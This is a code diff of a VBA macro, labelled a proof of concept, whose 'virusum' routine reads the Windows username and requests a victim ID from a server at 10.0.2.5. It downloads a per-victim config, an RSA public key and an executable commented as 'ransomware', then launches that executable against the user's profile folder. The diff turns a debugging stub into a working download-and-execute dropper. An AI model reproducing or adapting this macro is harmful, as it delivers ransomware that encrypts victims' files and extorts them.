@@ -10,7 +10,9 @@ PoC
 
 Function DownloadFile(url As String, save_location As String)
     ' MsgBox "File Download has Begun"
-    
+    ' MsgBox "URL: " + url
+    ' MsgBox "Save Locaiton: " + save_location
+   
     Dim WinHttpReq As Object
     Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
     WinHttpReq.Open "GET", url, False
@@ -38,21 +40,27 @@ End Function
 
 Public Sub virusum()
 
-
-    Dim username, domain, savelocation As String
+    Dim username, domain, saveRootlocation As String
     username = Environ$("username")
     domain = "http://10.0.2.5"
-    savelocation = "C:\Users\" + username + "\Desktop\"
+    saveRootlocation = "C:\Users\" & username & "\"
+
+    victimid = httpGet("http://10.0.2.5/getid.php")
     
-    victimid = httpGet("http://10.0.2.5/getid")
+    Dim config_file_location, rsa_pub_file_location, ransomware_file_location As String
+    config_file_location = saveRootlocation & victimid & "_config.txt"
+    rsapublickey_file_location = saveRootlocation & victimid & "_rsa_public_key.pub"
+    aptal_file_location = saveRootlocation & "aptal.exe"
+
+    ' config
+    DownloadFile domain + "/config/" + victimid + "_config.txt", saveRootlocation & victimid & "_config.txt"
+    ' rsa
+    DownloadFile domain + "/keys/" + victimid + "_rsa_public_key.pub", saveRootlocation & victimid & "_rsa_public_key.pub"
+    ' ransomware
+    DownloadFile domain + "/aptalonline.exe", saveRootlocation & "aptal.exe"
     
-    MsgBox savelocation + victimid + "_config.txt"
-    DownloadFile domain + "/config/" + victimid + "_config.txt", savelocation + victimid + "_config.txt"
-    
+    varProc = Shell(aptal_file_location & " " & saveRootlocation, 1)
     
 End Sub
 
-
-    ' strRoboappPath = "C:\Users\rnsm\aptal.exe" 'Your path here
-    ' varProc = Shell(strRoboappPath, 1)
 
